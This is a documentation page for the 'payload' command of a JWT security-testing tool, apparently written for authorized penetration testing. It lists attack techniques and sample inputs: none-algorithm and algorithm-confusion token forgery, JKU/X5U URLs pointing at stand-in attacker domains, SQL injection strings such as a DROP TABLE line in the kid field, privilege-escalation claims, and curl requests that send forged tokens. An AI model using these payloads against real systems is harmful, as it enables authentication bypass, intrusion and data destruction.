+++
toc = true
title = "Payload Command"
weight = 5
+++

The `payload` command generates various JWT attack payloads for security testing and vulnerability assessment.

## Basic Usage

```bash
jwt-hack payload <TOKEN> [OPTIONS]
```

## Attack Payload Types

### None Algorithm Attack

Remove signature verification requirement:

```bash
jwt-hack payload <TOKEN> --target=none
```

Generates payloads with:
- `alg: "none"` (lowercase)
- `alg: "None"` (capitalized)
- `alg: "NONE"` (uppercase)
- Various case combinations

### Algorithm Confusion Attack

Convert RSA/ECDSA tokens to HMAC using the public key as the secret:

```bash
# Without a key: emits an unsigned HMAC-downgrade header + a `none` downgrade
jwt-hack payload <RSA_TOKEN> --target=alg_confusion

# With the recovered server public key: forges a FULLY SIGNED HS256 token
jwt-hack payload <RSA_TOKEN> --target=alg_confusion --public-key=./server_pub.pem

# The value may also be an inline PEM string
jwt-hack payload <RSA_TOKEN> --target=alg_confusion --public-key="$(cat server_pub.pem)"
```

Creates payloads that:
- Downgrade the algorithm from RS/PS/ES/EdDSA to the matching HMAC family (HS256/384/512)
- Use the public key content as the HMAC secret when `--public-key` is supplied
- Emit a signed token per common PEM byte-normalization (as-provided, trailing-newline,
  no-newline) — real-world alg-confusion often fails on exact-byte mismatches, so all
  variants are produced to maximize the chance of a hit
- Always include a `none` downgrade variant

### JKU/X5U URL Attacks

Manipulate JSON Web Key URLs:

```bash
# Basic JKU/X5U attack
jwt-hack payload <TOKEN> --target=jku

# With trusted domain bypass
jwt-hack payload <TOKEN> --jwk-trust=trusted.com --jwk-attack=evil.com

# Custom protocol and attack domain
jwt-hack payload <TOKEN> --jwk-attack=attacker.com --jwk-protocol=http
```

Generates payloads with:
- Malicious JKU URLs pointing to attacker-controlled keys
- X5U URLs for certificate chain manipulation
- Domain bypass techniques
- Protocol downgrade attacks

### KID SQL Injection

Inject SQL payloads in Key ID field:

```bash
jwt-hack payload <TOKEN> --target=kid_sql
```

Generates payloads with SQL injection vectors:
- `' OR 1=1--`
- `'; DROP TABLE users;--`
- `' UNION SELECT null--`
- Time-based blind SQL injection payloads

### X5C Certificate Injection

Inject malicious certificate chains:

```bash
jwt-hack payload <TOKEN> --target=x5c
```

Creates payloads with:
- Malicious certificate chains
- Self-signed certificates
- Certificate with custom extensions
- Chain validation bypass attempts

### CTY Content Type Attacks

Manipulate content type headers for XXE and deserialization:

```bash
jwt-hack payload <TOKEN> --target=cty
```

Generates payloads with content types for:
- `text/xml` - XML External Entity (XXE) attacks
- `application/xml` - XML processing vulnerabilities
- `application/x-java-serialized-object` - Java deserialization
- `application/json+x-jackson-smile` - Jackson deserialization

### Claims (Payload) Attacks

Tamper with the token body itself (all emitted as `alg:none`, so they land once a
signature bypass is in hand — pair with `encode` to re-sign once a key is recovered):

```bash
# Privilege escalation: role/roles/scope/scp/admin/isAdmin/groups/authorities/...
jwt-hack payload <TOKEN> --target=claims_privesc

# Expiry manipulation: remove/extend exp, string/overflow/negative type juggling, nbf/iat
jwt-hack payload <TOKEN> --target=claims_exp

# iss/aud/sub confusion: aud string<->array & wildcard, iss toggles, sub type juggling,
# plus a raw duplicate-key claims body
jwt-hack payload <TOKEN> --target=claims_confusion
```

### JWE Header Confusion / DoS Probes

Exercise a server's *encrypted*-token (JWE) code path without real encryption — interpret
results by the server's differential/DoS response, not by successful decryption:

```bash
jwt-hack payload <TOKEN> --target=jwe
```

Covers PBES2 `p2c` iteration-count DoS, `alg:dir` direct-key confusion, key-management
`alg` downgrades (RSA1_5, A128KW, ECDH-ES, …), ECDH-ES invalid-curve `epk` injection, and
JWS/JWE type confusion.

### Signature Malleability

```bash
jwt-hack payload <ES_TOKEN> --target=sig_malleability
```

For ECDSA (ES256/384/512) tokens, produces a genuinely valid alternative signature via the
classic `s' = n - s` high-S malleability (accepted by verifiers that don't enforce low-S),
plus a DER-encoded signature variant (JWS mandates raw `r||s`). For any signed token it also
emits structural probes — all-zero, truncated, and trailing-byte-extended signatures.

### KID Injection (beyond SQL)

```bash
jwt-hack payload <TOKEN> --target=kid_injection
```

Injects NoSQL (including operator objects like `{"$ne": null}`), OS command, SSTI, LDAP, and
CRLF/header-injection vectors into the `kid` header — the sink fires during key lookup.

### Claim-value Injection

```bash
jwt-hack payload <TOKEN> --target=claim_injection
```

Sprays XSS, SQLi, SSTI, path-traversal, log4j JNDI, and CRLF payloads into every
string-valued claim (plus a `name` claim), for downstream consumers that reflect claim
values into HTML, SQL, templates, logs, or HTTP headers.

## Generate All Payload Types

Create comprehensive attack payload set:

```bash
# Generate all attack types
jwt-hack payload <TOKEN> --target=all

# All attacks with custom domains
jwt-hack payload <TOKEN> --target=all --jwk-attack=evil.com --jwk-trust=trusted.com
```

## Command Options

### Required
- `<TOKEN>` - Base JWT token for payload generation

### Target Selection
- `--target <TYPE>` - Payload types (comma-separated):
  - **Algorithm tricks**: `none`, `alg_confusion`, `alg_edge`, `alg_family_swap`, `none_sig`
  - **Header / URL attacks**: `jku`, `x5u`, `ssrf`, `x5c`, `x5c_signed`, `cty`, `crit`, `b64`, `zip`, `typ_confusion`, `header_quirks`, `dup_key`, `nested`, `jws_json`
  - **Key resolution attacks**: `kid_sql`, `kid_traversal`, `kid_predictable`, `kid_wildcard`, `jwk_embed`, `jwk_embed_ec`
  - **Signature attacks**: `empty_sig`, `psychic`, `sig_malleability`
  - **Claims (body) attacks**: `claims_privesc`, `claims_exp`, `claims_confusion`
  - **Injection**: `kid_injection`, `claim_injection`
  - **JWE (encrypted JWT) probes**: `jwe`
  - **All categories**: `all`

### Algorithm Confusion Options
- `--public-key <PEM|PATH>` - Server public key, as an inline PEM string or a file path.
  When supplied, `alg_confusion` forges fully signed RS/ES→HS tokens using the key bytes
  as the HMAC secret (also exposed over the HTTP server API and MCP tool).

### JKU/X5U Attack Options
- `--jwk-trust <DOMAIN>` - Trusted domain for bypass techniques
- `--jwk-attack <DOMAIN>` - Attacker-controlled domain
- `--jwk-protocol <PROTOCOL>` - Protocol to use (http/https, default: https)

## Output Format

Payloads are displayed with:
- Attack type identifier
- Modified JWT token
- Description of the attack vector
- Usage recommendations

Example output:
```
🎯 None Algorithm Attack Payloads:

[1] None Algorithm (lowercase)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.

[2] None Algorithm (capitalized)
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.

[3] None Algorithm (uppercase)
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
```

## Attack Scenarios

### Testing Authentication Bypass
```bash
# Test if application accepts unsigned tokens
jwt-hack payload <TOKEN> --target=none

# Test each generated payload:
curl -H "Authorization: Bearer <NONE_PAYLOAD>" https://api.example.com/user
```

### Algorithm Confusion Testing
```bash
# Generate algorithm confusion payloads
jwt-hack payload <RSA_TOKEN> --target=alg_confusion

# Test with public key content as HMAC secret
curl -H "Authorization: Bearer <CONFUSED_PAYLOAD>" https://api.example.com/admin
```

### Key URL Manipulation
```bash
# Test JKU/X5U URL attacks
jwt-hack payload <TOKEN> --target=jku --jwk-attack=attacker.com

# Host malicious JWK at attacker.com/keys.json
# Test if application fetches keys from attacker URL
```

### SQL Injection in KID
```bash
# Generate KID SQL injection payloads
jwt-hack payload <TOKEN> --target=kid_sql

# Test each payload for SQL injection responses
# Monitor application logs for SQL errors
```

## Security Testing Workflow

### 1. Reconnaissance
```bash
# Decode token to understand structure
jwt-hack decode <TOKEN>

# Generate comprehensive payload set
jwt-hack payload <TOKEN> --target=all
```

### 2. Systematic Testing
```bash
# Test none algorithm bypasses
jwt-hack payload <TOKEN> --target=none

# Test each payload systematically
# Document responses and behaviors
```

### 3. Advanced Attacks
```bash
# Algorithm confusion (if RSA token)
jwt-hack payload <RSA_TOKEN> --target=alg_confusion

# URL manipulation attacks
jwt-hack payload <TOKEN> --target=jku --jwk-attack=controlled-domain.com
```

## Payload Customization

### Custom Domains
```bash
# Use specific attack domains
jwt-hack payload <TOKEN> --target=jku --jwk-attack=evil.hacker.com

# Bypass domain restrictions
jwt-hack payload <TOKEN> --target=x5u --jwk-trust=trusted.com --jwk-attack=evil.com
```

### Protocol Selection
```bash
# Force HTTP for testing
jwt-hack payload <TOKEN> --target=jku --jwk-protocol=http --jwk-attack=attacker.com

# Test protocol downgrade vulnerabilities
```

## Integration with Testing Frameworks

### Burp Suite Integration
1. Generate payloads with JWT-HACK
2. Import into Burp Intruder
3. Use as payload list for systematic testing

### Custom Scripts
```bash
# Generate and test programmatically
jwt-hack payload <TOKEN> --target=all > payloads.txt

# Process payloads in custom testing script
while read payload; do
    test_jwt_payload "$payload"
done < payloads.txt
```

## Best Practices

### Responsible Testing
- Only test applications you own or have permission to test
- Document all findings appropriately
- Follow responsible disclosure practices

### Comprehensive Coverage
- Test all payload types systematically
- Combine with other testing techniques
- Verify results manually when automated tools indicate vulnerabilities
